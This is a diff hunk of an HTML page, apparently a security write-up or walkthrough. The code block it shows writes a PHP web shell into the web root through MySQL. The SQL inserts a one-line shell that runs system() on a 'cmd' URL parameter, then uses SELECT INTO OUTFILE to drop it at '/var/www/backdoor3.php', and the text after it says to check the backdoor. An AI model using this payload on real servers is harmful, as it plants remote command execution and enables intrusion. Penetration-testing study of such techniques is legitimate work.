@@ -272,7 +272,7 @@ $(document).ready(
 </pre></td><td class='code'><pre><code class=''><span class='line'>create database pwn;
 </span><span class='line'>create table backdoor(script text);
 </span><span class='line'>insert into backdoor(script) values('&lt;?php echo "&lt;pre&gt;"; system($_GET["cmd"]); echo "&lt;/pre&gt;"; ?&gt;');
-</span><span class='line'>select * into outfile "/var/www/shells.php" from backdoor;</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'>select * into outfile "/var/www/backdoor3.php" from backdoor;</span></code></pre></td></tr></table></div></figure>
 
 
 <p>check the backdoor.</p>
